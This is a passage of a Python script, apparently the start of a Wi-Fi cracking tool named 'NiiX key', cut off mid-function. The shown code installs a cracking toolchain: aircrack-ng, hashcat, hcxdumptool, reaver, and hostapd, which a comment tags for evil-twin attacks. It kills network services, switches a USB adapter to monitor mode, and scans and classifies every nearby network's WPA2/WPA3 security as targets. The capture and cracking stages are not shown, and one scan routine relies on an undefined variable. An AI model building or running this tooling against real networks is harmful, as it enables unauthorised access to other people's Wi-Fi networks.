#!/usr/bin/env python3

# NiiX key - WiFi Script
# Created by: cuteLiLi / techniix / QuacK
# Version: beta 2.0 

import subprocess
from collections import namedtuple
import os
import sys
import time
import platform
import shutil
import importlib
import tempfile
import json
import re
import threading

# ─────────────────────────────────────────────
#  ANSI colour & style helpers
# ─────────────────────────────────────────────
class C:
    RESET    = '\033[0m'
    BOLD     = '\033[1m'
    DIM      = '\033[2m'
    RED      = '\033[31m'
    GREEN    = '\033[32m'
    YELLOW   = '\033[33m'
    BLUE     = '\033[34m'
    MAGENTA  = '\033[35m'
    CYAN     = '\033[36m'
    WHITE    = '\033[37m'
    BRED     = '\033[91m'
    BGREEN   = '\033[92m'
    BYELLOW  = '\033[93m'
    BBLUE    = '\033[94m'
    BMAGENTA = '\033[95m'
    BCYAN    = '\033[96m'
    BWHITE   = '\033[97m'

def c(text, *codes):
    return ''.join(codes) + str(text) + C.RESET

def ok(msg):   print(f"  {c('✔', C.BGREEN, C.BOLD)}  {c(msg, C.BGREEN)}")
def info(msg): print(f"  {c('◆', C.BCYAN,  C.BOLD)}  {c(msg, C.CYAN)}")
def warn(msg): print(f"  {c('▲', C.BYELLOW,C.BOLD)}  {c(msg, C.BYELLOW)}")
def err(msg):  print(f"  {c('✘', C.BRED,   C.BOLD)}  {c(msg, C.BRED)}")
def ask(msg):  return input(f"  {c('?', C.BMAGENTA, C.BOLD)}  {c(msg, C.BMAGENTA, C.BOLD)} ")

def section(title):
    w     = 62
    pad   = (w - len(title) - 4) // 2
    side  = c('─' * pad, C.BLUE, C.BOLD)
    label = c(f' {title} ', C.BWHITE, C.BOLD)
    print(f"\n{side}{c('[', C.BLUE, C.BOLD)}{label}{c(']', C.BLUE, C.BOLD)}{side}\n")

def divider():
    print(c('─' * 62, C.BLUE, C.DIM))


# ─────────────────────────────────────────────
#  Real-time progress bar (background thread)
# ─────────────────────────────────────────────
class ProgressBar:
    def __init__(self, total_seconds, label='Working', width=38):
        self.total   = total_seconds
        self.label   = label
        self.width   = width
        self._stop   = threading.Event()
        self._thread = threading.Thread(target=self._run, daemon=True)

    def start(self):
        self._start = time.time()
        self._thread.start()
        return self

    def stop(self):
        self._stop.set()
        self._thread.join()
        self._render(self.total, self.total)   # lock to 100 %
        print()

    def _render(self, elapsed, total):
        pct    = min(elapsed / total, 1.0)
        filled = int(self.width * pct)
        empty  = self.width - filled
        bar    = c('█' * filled, C.BCYAN, C.BOLD) + c('░' * empty, C.DIM)
        p_str  = c(f'{pct*100:5.1f}%', C.BWHITE, C.BOLD)
        remain = max(0, int(total - elapsed))
        eta    = c(f'{remain:3d}s', C.BYELLOW)
        lbl    = c(self.label, C.CYAN, C.BOLD)
        print(f"\r  {lbl}  [{bar}] {p_str}  ETA {eta}  ", end='', flush=True)

    def _run(self):
        while not self._stop.is_set():
            elapsed = time.time() - self._start
            self._render(elapsed, self.total)
            time.sleep(0.2)

# Try to import scapy at module level
try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

# Track monitor interface globally so cleanup can find it
MONITOR_IFACE = None

# Define a named tuple to store network information
# security field: 'WPA3', 'WPA3/WPA2', 'WPA2', 'WPA', 'WEP', 'OPEN', or 'UNKNOWN'
Network = namedtuple('Network', ['ssid', 'bssid', 'channel', 'signal', 'security'])


class LinuxDistroDetector:
    """Detect and handle different Linux distributions."""

    DISTROS = {
        'kali': {
            'name': 'Kali Linux',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
                'libssl_dev': 'libssl-dev',
                'build_essential': 'build-essential',
                'openssl': 'openssl',
            }
        },
        'ubuntu': {
            'name': 'Ubuntu',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'python3_dev': 'python3-dev',
                'libpcap_dev': 'libpcap-dev',
                'libssl_dev': 'libssl-dev',
                'build_essential': 'build-essential',
                'openssl': 'openssl',
            }
        },
        'debian': {
            'name': 'Debian',
            'pkg_manager': 'apt-get',
            'install_cmd': ['apt-get', 'install', '-y'],
            'update_cmd': ['apt-get', 'update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpasupplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-venv',
                'libpcap_dev': 'libpcap-dev',
                'libssl_dev': 'libssl-dev',
                'build_essential': 'build-essential',
                'openssl': 'openssl',
            }
        },
        'arch': {
            'name': 'Arch Linux',
            'pkg_manager': 'pacman',
            'install_cmd': ['pacman', '-S', '--noconfirm', '--needed'],
            'update_cmd': ['pacman', '-Sy'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'hostapd': 'hostapd',
                'pip': 'python-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python-virtualenv',
                'libpcap_dev': 'libpcap',
                'libssl_dev': 'openssl',
                'build_essential': 'base-devel',
                'openssl': 'openssl',
            }
        },
        'fedora': {
            'name': 'Fedora',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
                'libssl_dev': 'openssl-devel',
                'build_essential': 'gcc make',
                'openssl': 'openssl',
            }
        },
        'rhel': {
            'name': 'RHEL/CentOS/Rocky',
            'pkg_manager': 'dnf',
            'install_cmd': ['dnf', 'install', '-y'],
            'update_cmd': ['dnf', 'check-update'],
            'pkg_names': {
                'aircrack': 'aircrack-ng',
                'scapy': 'python3-scapy',
                'hcxtools': 'hcxtools',
                'hcxdumptool': 'hcxdumptool',
                'hashcat': 'hashcat',
                'reaver': 'reaver',
                'wpasupplicant': 'wpa_supplicant',
                'hostapd': 'hostapd',
                'pip': 'python3-pip',
                'iw': 'iw',
                'net_tools': 'net-tools',
                'python3_venv': 'python3-virtualenv',
                'python3_dev': 'python3-devel',
                'libpcap_dev': 'libpcap-devel',
                'libssl_dev': 'openssl-devel',
                'build_essential': 'gcc make',
                'openssl': 'openssl',
            }
        },
    }

    @staticmethod
    def detect_distro():
        """Detect the Linux distribution."""
        try:
            if os.path.exists('/etc/os-release'):
                with open('/etc/os-release', 'r') as f:
                    content = f.read().lower()

                if 'kali' in content:
                    return LinuxDistroDetector.DISTROS['kali']
                elif 'arch' in content or 'manjaro' in content or 'endeavouros' in content:
                    return LinuxDistroDetector.DISTROS['arch']
                elif 'fedora' in content:
                    return LinuxDistroDetector.DISTROS['fedora']
                elif 'centos' in content or 'rhel' in content or 'rocky' in content or 'almalinux' in content:
                    return LinuxDistroDetector.DISTROS['rhel']
                elif 'ubuntu' in content:
                    ubuntu_info = LinuxDistroDetector.DISTROS['ubuntu'].copy()
                    for line in content.split('\n'):
                        if 'version_id' in line:
                            try:
                                version = line.split('=')[1].strip().strip('"')
                                if int(version.split('.')[0]) >= 23:
                                    ubuntu_info['needs_venv'] = True
                            except Exception:
                                pass
                    return ubuntu_info
                elif 'debian' in content:
                    return LinuxDistroDetector.DISTROS['debian']

            # Fallback: detect by which package manager exists
            if shutil.which('pacman'):
                return LinuxDistroDetector.DISTROS['arch']
            elif shutil.which('dnf'):
                return LinuxDistroDetector.DISTROS['fedora']
            elif shutil.which('apt-get'):
                return LinuxDistroDetector.DISTROS['debian']

            return LinuxDistroDetector.DISTROS['debian']

        except Exception as e:
            warn(f"Could not detect distribution: {e}")
            return LinuxDistroDetector.DISTROS['debian']


def get_os():
    """Detect operating system."""
    system = platform.system()
    if system == "Linux":
        distro_info = LinuxDistroDetector.detect_distro()
        return distro_info['name']
    return "Unknown"


def check_pkg_manager(distro_info):
    """Check if package manager is available."""
    pkg_manager = distro_info['pkg_manager']
    if shutil.which(pkg_manager):
        return True
    # Try alternatives
    for alt in ['apt-get', 'apt', 'pacman', 'dnf', 'yum']:
        if shutil.which(alt):
            distro_info['install_cmd'][0] = alt
            distro_info['update_cmd'][0] = alt
            return True
    return False


def run_command(cmd, show_output=True, timeout=300):
    """Run a command and return result. Timeout is 5 minutes by default for installs."""
    try:
        result = subprocess.run(
            cmd,
            capture_output=True,
            text=True,
            timeout=timeout
        )
        if show_output and result.stdout:
            print(result.stdout)
        if show_output and result.stderr:
            print(f"Stderr: {result.stderr}")
        return result.returncode == 0, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        err(f"Command timed out: {' '.join(cmd)}")
        return False, "", "Timeout"
    except Exception as e:
        err(f"Command error: {e}")
        return False, "", str(e)


def install_system_package(distro_info, package_key):
    """Install a system package."""
    try:
        package_name = distro_info['pkg_names'].get(package_key)
        if not package_name:
            # Key not defined for this distro — silently skip
            return True

        cmd = ['sudo'] + distro_info['install_cmd'] + [package_name]
        info(f"Installing {package_name}...")

        success, stdout, stderr = run_command(cmd, show_output=False)

        if success:
            ok(f"Installed {package_name}")
            return True
        else:
            err(f"Failed to install {package_name}: {stderr.strip()[:120]}")
            return False

    except Exception as e:
        err(f"Error installing {package_key}: {e}")
        return False


def install_pip_package(package_name):
    """Install Python package via pip, trying multiple strategies."""
    pip_cmd = None
    for cmd in ['pip3', 'pip']:
        if shutil.which(cmd):
            pip_cmd = cmd
            break

    if not pip_cmd:
        err("pip not found")
        return False

    strategies = [
        [pip_cmd, 'install', package_name],
        [pip_cmd, 'install', '--break-system-packages', package_name],
        ['python3', '-m', 'pip', 'install', package_name],
        ['python3', '-m', 'pip', 'install', '--break-system-packages', package_name],
    ]

    for strategy in strategies:
        cmd = ['sudo'] + strategy
        info(f"Trying: {' '.join(cmd)}")
        success, stdout, stderr = run_command(cmd, show_output=False)
        if success:
            ok(f"Installed {package_name} via pip")
            return True

    err(f"All pip strategies failed for {package_name}")
    return False


def get_monitor_interface(base_interface):
    """Detect the actual monitor interface name created by airmon-ng."""
    # Give airmon-ng a moment to create the interface
    time.sleep(2)

    candidates = [
        f"{base_interface}mon",
        f"{base_interface}mon0",
    ]

    # Also check 'iw dev' for any monitor-mode interface
    try:
        result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
        if result.returncode == 0:
            iface = None
            in_iface = False
            for line in result.stdout.split('\n'):
                line = line.strip()
                if line.startswith('Interface'):
                    iface = line.split()[1]
                    in_iface = True
                elif in_iface and 'type monitor' in line:
                    if iface and iface not in candidates:
                        candidates.insert(0, iface)
                    in_iface = False
                elif line == '':
                    in_iface = False
    except Exception:
        pass

    for c in candidates:
        if os.path.exists(f'/sys/class/net/{c}'):
            return c

    # Fallback
    return f"{base_interface}mon"


def create_virtual_env():
    """Create a Python virtual environment."""
    venv_path = '/tmp/niixkey_venv'
    try:
        if os.path.exists(venv_path):
            shutil.rmtree(venv_path)

        info(f"Creating virtual environment at {venv_path}...")
        success, stdout, stderr = run_command(['python3', '-m', 'venv', venv_path])
        if not success:
            err(f"Failed to create venv: {stderr}")
            return None

        python_path = os.path.join(venv_path, 'bin', 'python3')
        if not os.path.exists(python_path):
            err("Virtual environment not created properly")
            return None

        ok("Virtual environment created")
        return venv_path

    except Exception as e:
        err(f"Error creating virtual environment: {e}")
        return None


def install_in_virtual_env(venv_path, package_name):
    """Install package inside a virtual environment."""
    pip_path = os.path.join(venv_path, 'bin', 'pip')
    if not os.path.exists(pip_path):
        err("pip not found in venv")
        return False

    info(f"Installing {package_name} in virtual environment...")
    success, stdout, stderr = run_command([pip_path, 'install', package_name], show_output=False)
    if success:
        ok(f"Installed {package_name} in venv")
        return True
    err(f"Failed to install {package_name} in venv: {stderr.strip()[:120]}")
    return False


def check_and_install_scapy(distro_info):
    """Install scapy using multiple fallback strategies."""
    global SCAPY_AVAILABLE

    if SCAPY_AVAILABLE:
        ok("scapy is already installed and importable")
        return True

    warn("scapy not found — attempting installation...")

    def _try_import_scapy():
        """Attempt to import scapy and update globals. Returns True on success."""
        global SCAPY_AVAILABLE
        importlib.invalidate_caches()
        try:
            import scapy.all as _sa
            import scapy.layers.dot11 as _sd11
            # Inject the needed names into the module's global namespace
            g = sys.modules[__name__].__dict__
            for name in dir(_sa):
                g[name] = getattr(_sa, name)
            g['Dot11'] = _sd11.Dot11
            g['Dot11Beacon'] = _sd11.Dot11Beacon
            g['Dot11Elt'] = _sd11.Dot11Elt
            SCAPY_AVAILABLE = True
            return True
        except ImportError:
            return False

    # Strategy 1: System package
    info("Strategy 1: System package...")
    if install_system_package(distro_info, 'scapy'):
        if _try_import_scapy():
            ok("scapy importable after system install")
            return True
        err("System package installed but cannot import")

    # Strategy 2: pip
    info("Strategy 2: pip install...")
    if install_pip_package('scapy'):
        if _try_import_scapy():
            ok("scapy importable after pip install")
            return True
        err("pip installed but cannot import")

    # Strategy 3: virtualenv
    info("Strategy 3: Virtual environment...")
    install_system_package(distro_info, 'python3_venv')
    venv_path = create_virtual_env()
    if venv_path and install_in_virtual_env(venv_path, 'scapy'):
        venv_site = os.path.join(
            venv_path, 'lib',
            f'python{sys.version_info.major}.{sys.version_info.minor}',
            'site-packages'
        )
        if os.path.exists(venv_site):
            sys.path.insert(0, venv_site)
            if _try_import_scapy():
                ok("scapy importable from virtual environment")
                return True
            err("Cannot import from venv")

    err("All scapy installation strategies failed")
    return False


def check_tool(tool_name):
    """Check if a CLI tool is available."""
    return shutil.which(tool_name) is not None


def check_all_dependencies():
    """Check if all required tools are available."""
    required_tools = [
        'airmon-ng',
        'airodump-ng',
        'aireplay-ng',
        'aircrack-ng',
        'iw',
        'hashcat',
    ]

    missing_tools = [t for t in required_tools if not check_tool(t)]

    # hcxtools — binary name varies between versions
    if not check_tool('hcxpcapngtool') and not check_tool('hcxpcaptool'):
        missing_tools.append('hcxpcapngtool/hcxpcaptool')

    # hcxdumptool — needed for PMKID capture (WPA3 / modern WPA2)
    if not check_tool('hcxdumptool'):
        missing_tools.append('hcxdumptool')

    global SCAPY_AVAILABLE
    if not SCAPY_AVAILABLE:
        missing_tools.append('scapy (python)')

    if missing_tools:
        err(f"Missing: {', '.join(missing_tools)}")
        return False

    return True


def install_hcxdumptool_from_source():
    """Build and install hcxdumptool from source as a fallback."""
    info("Attempting to build hcxdumptool from source…")
    build_dir = '/tmp/hcxdumptool_build'
    try:
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir)
        os.makedirs(build_dir)

        # Clone repo
        r = subprocess.run(
            ['git', 'clone', '--depth', '1',
             'https://github.com/ZerBea/hcxdumptool.git', build_dir],
            capture_output=True, text=True, timeout=120
        )
        if r.returncode != 0:
            err("git clone failed — check internet / git install")
            return False

        # Build
        r = subprocess.run(['make'], cwd=build_dir, capture_output=True, text=True, timeout=180)
        if r.returncode != 0:
            err(f"make failed: {r.stderr.strip()[:200]}")
            return False

        # Install
        r = subprocess.run(['sudo', 'make', 'install'], cwd=build_dir,
                           capture_output=True, text=True, timeout=60)
        if r.returncode == 0:
            ok("hcxdumptool built and installed from source")
            return True
        err(f"make install failed: {r.stderr.strip()[:200]}")
        return False
    except Exception as e:
        err(f"Source build error: {e}")
        return False


def install_dependencies():
    """Install all necessary dependencies including WPA3 toolchain."""
    info("Installing dependencies…")

    distro_info = LinuxDistroDetector.detect_distro()
    info(f"Detected distro: {distro_info['name']}")

    if not check_pkg_manager(distro_info):
        err("No supported package manager found")
        return False

    try:
        info("Updating package database…")
        update_cmd = ['sudo'] + distro_info['update_cmd']
        run_command(update_cmd, show_output=False)

        # Core tools needed for WPA2 and scanning
        essential_packages = [
            'pip',
            'iw',
            'net_tools',
            'aircrack',
            'hcxtools',
            'libpcap_dev',
            'libssl_dev',
            'build_essential',
            'openssl',
        ]

        # WPA3 + extended cracking toolchain
        extended_packages = [
            'hcxdumptool',    # PMKID capture — key for WPA3-SAE-transition and WPA2-PMKID
            'hashcat',        # GPU-accelerated cracking (hc22000 for WPA2/WPA3)
            'hostapd',        # Evil-twin / SAE analysis
            'wpasupplicant',  # Connection after cracking
            'reaver',         # WPS fallback
            'python3_dev',
            'python3_venv',
        ]

        for pkg_key in essential_packages:
            install_system_package(distro_info, pkg_key)

        for pkg_key in extended_packages:
            install_system_package(distro_info, pkg_key)

        # hcxdumptool source fallback if package manager didn't have it
        if not check_tool('hcxdumptool'):
            if shutil.which('git') and shutil.which('make'):
                install_hcxdumptool_from_source()
            else:
                warn("git/make not available — cannot build hcxdumptool from source")

        # Scapy (critical for scanning)
        info("Installing scapy…")
        if not check_and_install_scapy(distro_info):
            warn("Could not install scapy properly")
            response = ask("Continue anyway? [y/N]")
            if response.strip().lower() != 'y':
                return False

        # Verify
        info("Verifying installed tools…")
        tools_to_check = [
            'airmon-ng', 'airodump-ng', 'aireplay-ng', 'aircrack-ng',
            'iw', 'hashcat', 'hcxdumptool',
        ]
        verified = [t for t in tools_to_check if check_tool(t)]
        missing  = [t for t in tools_to_check if not check_tool(t)]

        if verified:
            ok(f"Verified: {', '.join(verified)}")
        if missing:
            warn(f"Still missing: {', '.join(missing)}")

        # hcxtools converter binary check
        if not check_tool('hcxpcapngtool') and not check_tool('hcxpcaptool'):
            warn("hcxpcapngtool/hcxpcaptool not found — WPA2 PMKID conversion may be limited")

        critical_missing = [t for t in ['airmon-ng', 'airodump-ng', 'aircrack-ng'] if t in missing]
        if critical_missing:
            err(f"Critical tools missing: {', '.join(critical_missing)}")
            return False

        return True

    except Exception as e:
        err(f"Error installing dependencies: {e}")
        return False


def is_usb_interface(iface):
    """Return True if the wireless interface is backed by a USB device."""
    # Walk the sysfs device tree from the interface upward looking for a 'usb' subsystem
    try:
        dev_path = f'/sys/class/net/{iface}/device'
        if not os.path.exists(dev_path):
            return False
        real_dev = os.path.realpath(dev_path)
        # Walk up the sysfs path; any component that contains 'usb' marks a USB device
        path = real_dev
        for _ in range(10):
            subsystem_link = os.path.join(path, 'subsystem')
            if os.path.exists(subsystem_link):
                subsystem = os.path.basename(os.path.realpath(subsystem_link))
                if subsystem in ('usb', 'usb_device'):
                    return True
            # Also check if any path component looks like a USB bus (e.g. /sys/bus/usb)
            if '/usb' in path:
                return True
            parent = os.path.dirname(path)
            if parent == path:
                break
            path = parent
    except Exception:
        pass
    return False


def get_wireless_interfaces():
    """Get available wireless interfaces — USB adapters only."""
    all_ifaces = []

    # Method 1: iw dev
    if check_tool('iw'):
        try:
            result = subprocess.run(['iw', 'dev'], capture_output=True, text=True)
            if result.returncode == 0:
                for line in result.stdout.split('\n'):
                    if 'Interface' in line:
                        iface = line.split()[1]
                        if iface not in all_ifaces:
                            all_ifaces.append(iface)
        except Exception:
            pass

    # Method 2: ip link (wlx prefix almost always means USB)
    try:
        result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True)
        if result.returncode == 0:
            for line in result.stdout.split('\n'):
                parts = line.split(':')
                if len(parts) >= 2:
                    iface = parts[1].strip().split('@')[0]
                    if iface.startswith(('wl', 'wlan', 'wlp', 'wlx')):
                        if iface not in all_ifaces:
                            all_ifaces.append(iface)
    except Exception:
        pass

    # Method 3: /sys/class/net
    try:
        for iface in os.listdir('/sys/class/net'):
            wireless_path = f'/sys/class/net/{iface}/wireless'
            if os.path.exists(wireless_path) and iface not in all_ifaces:
                all_ifaces.append(iface)
    except Exception:
        pass

    # Filter out monitor interfaces already running
    all_ifaces = [i for i in all_ifaces if not i.endswith('mon') and 'mon0' not in i]

    # ── USB-only filter ───────────────────────────────────────
    usb_ifaces = [i for i in all_ifaces if is_usb_interface(i)]

    if usb_ifaces:
        info(f"USB WiFi adapters detected:  {c(', '.join(usb_ifaces), C.BWHITE, C.BOLD)}")
        non_usb = [i for i in all_ifaces if i not in usb_ifaces]
        if non_usb:
            warn(f"Ignoring non-USB interfaces:  {c(', '.join(non_usb), C.DIM)}")
        return usb_ifaces
    else:
        warn("No USB wireless adapters detected via sysfs — listing all wireless interfaces")
        warn("Tip: Only use a USB WiFi adapter that supports monitor mode (e.g. AR9271, RT3070, RT5572)")
        return all_ifaces


def detect_security_from_airodump_csv(parts):
    """
    Parse the Privacy/Cipher/Auth columns from airodump-ng CSV row.
    CSV columns (0-indexed): 0=BSSID, 5=Privacy, 6=Cipher, 7=Authentication
    Returns a security string: 'WPA3', 'WPA3/WPA2', 'WPA2', 'WPA', 'WEP', 'OPEN'
    """
    try:
        privacy = parts[5].strip().upper() if len(parts) > 5 else ''
        cipher  = parts[6].strip().upper() if len(parts) > 6 else ''
        auth    = parts[7].strip().upper() if len(parts) > 7 else ''

        # WPA3: SAE auth (Simultaneous Authentication of Equals) = WPA3-Personal
        # OWE = WPA3-Enhanced Open
        if 'SAE' in auth or 'OWE' in auth:
            # Transition mode = both SAE and PSK accepted
            if 'PSK' in auth or 'WPA2' in privacy:
                return 'WPA3/WPA2'
            return 'WPA3'
        if 'WPA2' in privacy or 'WPA2' in cipher:
            return 'WPA2'
        if 'WPA' in privacy:
            return 'WPA'
        if 'WEP' in privacy:
            return 'WEP'
        if 'OPN' in privacy or privacy == '':
            return 'OPEN'
        return 'UNKNOWN'
    except Exception:
        return 'UNKNOWN'


def detect_security_from_iw(rsn_info, wpa_info, privacy_info):
    """
    Derive security type from iw scan RSN/WPA IE strings.
    rsn_info / wpa_info / privacy_info are lowercased strings from iw output.
    """
    if 'sae' in rsn_info:
        if 'psk' in rsn_info:
            return 'WPA3/WPA2'
        return 'WPA3'
    if rsn_info:
        return 'WPA2'
    if wpa_info:
        return 'WPA'
    if 'wep' in privacy_info:
        return 'WEP'
    if 'on' not in privacy_info and privacy_info:
        return 'OPEN'
    return 'UNKNOWN'



def scan_networks_airodump(interface, monitor_iface, duration=30):
    """
    Channel-hopping scan using airodump-ng to discover all SSIDs
    across 2.4 GHz (ch 1-14) and 5 GHz (ch 36-165).
    Returns a list of Network named-tuples with security type detected.
    """
    networks = []
    tmpdir   = tempfile.mkdtemp(prefix='niixscan_')
    cap_base = os.path.join(tmpdir, 'scan')

    cmd = [
        'sudo', 'airodump-ng',
        '--band', 'abg',
        '--output-format', 'csv',
        '-w', cap_base,
        '--write-interval', '1',
        monitor_iface
    ]

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        pb   = ProgressBar(duration, label='Scanning all channels')
        pb.start()
        time.sleep(duration)
        pb.stop()
        proc.terminate()
        proc.wait(timeout=5)
    except Exception as e:
        warn(f"airodump scan error: {e}")

    # Parse CSV — airodump columns:
    # 0:BSSID  1:First seen  2:Last seen  3:channel  4:Speed
    # 5:Privacy  6:Cipher  7:Authentication  8:Power  9:beacons
    # 10:IVs  11:LAN IP  12:ID-length  13:ESSID  14:Key
    csv_files = [f for f in os.listdir(tmpdir) if f.endswith('.csv')]
    for csv_name in csv_files:
        csv_path = os.path.join(tmpdir, csv_name)
        try:
            with open(csv_path, 'r', errors='ignore') as fh:
                content = fh.read()

            sections   = re.split(r'\n\s*\n', content, maxsplit=1)
            ap_section = sections[0] if sections else ''
            lines      = ap_section.strip().split('\n')

            for line in lines[2:]:
                parts = [p.strip() for p in line.split(',')]
                if len(parts) < 14:
                    continue
                bssid = parts[0].strip()
                if not re.match(r'([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid):
                    continue
                try:
                    signal = int(parts[8].strip())
                except Exception:
                    signal = -100
                try:
                    channel = int(parts[3].strip())
                except Exception:
                    channel = None
                ssid     = parts[13].strip() if len(parts) > 13 else '<Hidden>'
                if not ssid:
                    ssid = '<Hidden>'
                security = detect_security_from_airodump_csv(parts)
                networks.append(Network(ssid=ssid, bssid=bssid, channel=channel,
                                        signal=signal, security=security))
        except Exception as e:
            warn(f"CSV parse error ({csv_name}): {e}")

    try:
        shutil.rmtree(tmpdir, ignore_errors=True)
    except Exception:
        pass

    return networks




def scan_networks(interface):
    """Scan for WiFi networks — channel-hopping via airodump-ng, scapy, or iw fallback."""
    global SCAPY_AVAILABLE, MONITOR_IFACE

    info(f"Scanning on interface  {c(interface, C.BWHITE, C.BOLD)}")
    info("Enabling monitor mode for full-spectrum scan…")

    try:
        subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'],
                       capture_output=True, timeout=10)
        subprocess.run(['sudo', 'airmon-ng', 'start', interface],
                       capture_output=True, text=True, timeout=15)
        monitor_iface = get_monitor_interface(interface)
        MONITOR_IFACE = monitor_iface
        ok(f"Monitor interface ready  {c(monitor_iface, C.BWHITE, C.BOLD)}")
    except Exception as e:
        err(f"Monitor mode error: {e}")
        return scan_networks_alternative(interface)

    networks = []

    # ── Primary: airodump-ng channel-hopping (finds ALL SSIDs) ──
    if check_tool('airodump-ng'):
        info("Running airodump-ng channel-hopping scan (2.4 GHz + 5 GHz)…")
        networks = scan_networks_airodump(interface, monitor_iface, duration=30)
        if networks:
            ok(f"airodump-ng found {len(networks)} network(s)")

    # ── Secondary: scapy sniff (supplements airodump results) ──
    if SCAPY_AVAILABLE and len(networks) < 3:
        info("Supplementing with scapy passive scan…")
        scapy_nets = []

        def packet_handler(pkt):
            if pkt.haslayer(Dot11Beacon):
                try:
                    ssid    = "<Hidden>"
                    channel = None
                    signal  = -100
                    has_rsn = False
                    has_wpa = False
                    auth_suites = []

                    elt = pkt.getlayer(Dot11Elt)
                    while elt:
                        if elt.ID == 0 and elt.info:
                            ssid = elt.info.decode('utf-8', errors='ignore')
                        elif elt.ID == 3 and elt.info:
                            channel = elt.info[0] if isinstance(elt.info, (bytes, bytearray)) else ord(elt.info)
                        elif elt.ID == 48:   # RSN IE = WPA2/WPA3
                            has_rsn = True
                            # Parse AKM suite from RSN IE for WPA3 detection
                            try:
                                raw = bytes(elt.info)
                                # RSN IE layout: 2-ver, 4-group, 2-pairwise count, ...pairwise, 2-akm count, ...akm
                                if len(raw) >= 8:
                                    pc = int.from_bytes(raw[4:6], 'little')
                                    akm_off = 6 + pc * 4
                                    if len(raw) >= akm_off + 2:
                                        ac = int.from_bytes(raw[akm_off:akm_off+2], 'little')
                                        for i in range(ac):
                                            suite_off = akm_off + 2 + i * 4
                                            if len(raw) >= suite_off + 4:
                                                suite = raw[suite_off+3]  # OUI suffix byte
                                                auth_suites.append(suite)
                            except Exception:
                                pass
                        elif elt.ID == 221 and elt.info and elt.info[:3] == b'\x00\x50\xf2':
                            has_wpa = True   # WPA vendor IE
                        elt = elt.payload.getlayer(Dot11Elt) if hasattr(elt, 'payload') else None

                    if hasattr(pkt, 'dBm_AntSignal'):
                        signal = pkt.dBm_AntSignal

                    bssid = pkt.addr2

                    # AKM suite 8 = SAE (WPA3), 2 = PSK (WPA2), 6 = PSK-SHA256
                    if has_rsn and 8 in auth_suites:
                        security = 'WPA3/WPA2' if 2 in auth_suites else 'WPA3'
                    elif has_rsn:
                        security = 'WPA2'
                    elif has_wpa:
                        security = 'WPA'
                    else:
                        security = 'OPEN'

                    scapy_nets.append(Network(ssid=ssid, bssid=bssid, channel=channel,
                                              signal=signal, security=security))
                except Exception:
                    pass

        try:
            pb = ProgressBar(SCAN_DURATION, label='Scapy passive scan')
            pb.start()
            sniff(iface=monitor_iface, prn=packet_handler, timeout=SCAN_DURATION)
            pb.stop()
            # Merge unique results
            existing_bssids = {n.bssid for n in networks}
            for net in scapy_nets:
                if net.bssid not in existing_bssids:
                    networks.append(net)
                    existing_bssids.add(net.bssid)
        except Exception as e:
            warn(f"Scapy supplemental scan error: {e}")

    # Stop monitor mode
    try:
        subprocess.run(['sudo', 'airmon-ng', 'stop', monitor_iface],
                       capture_output=True, timeout=10)
        MONITOR_IFACE = None
        restart_network_manager()
    except Exception:
        pass

    # Deduplicate and sort
    unique_nets = {}
    for net in networks:
        if net.bssid not in unique_nets or net.signal > unique_nets[net.bssid].signal:
            unique_nets[net.bssid] = net

    result_list = sorted(unique_nets.values(), key=lambda x: x.signal, reverse=True)

    if not result_list:
        warn("No networks found — falling back to iw scan…")
        return scan_networks_alternative(interface)

    return result_list


def scan_networks_alternative(interface):
    """Alternative network scanning using iw scan — parses RSN/WPA IEs for security type."""
    info("Using iw scan method…")
    networks = []

    IW_TIMEOUT = 30
    pb = ProgressBar(IW_TIMEOUT, label='Scanning  (iw) ')
    pb.start()

